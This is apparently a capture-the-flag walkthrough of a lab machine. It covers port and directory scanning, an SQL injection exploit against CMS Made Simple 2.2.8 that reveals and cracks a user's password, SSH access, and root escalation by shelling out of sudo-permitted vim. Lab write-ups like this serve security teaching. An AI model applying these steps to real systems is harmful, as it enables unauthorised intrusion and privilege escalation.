```bash
export IP=10.10.246.121
```

# Nmap

Open ports:

```
21 ftp
80 http
2222 ssh
```

# Nikto

```
+ "robots.txt" contains 2 entries which should be manually viewed.
```

Robots.txt: ```Disallow: /openemr-5_0_1_3``` (404)

# Gobuster

Found files:

```
/index.html (Status: 200)
/robots.txt (Status: 200)
/simple (Status: 301)
```

/simple is made by "CMS Made Simple" v.2.2.8, which has [SQL vulnerability](https://www.cvedetails.com/vulnerability-list/vendor_id-3206/product_id-5627/version_id-270038/Cmsmadesimple-Cms-Made-Simple-2.2.8.html)

Using pythno2 cms exploit:

```bash
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

# SSH

```bash
ssh mitch@$IP -p 2222
```

# VIM

```bash
sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

Using VIM:
```bash
sudo vim test
```
Then

```bash
:sh!
```

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```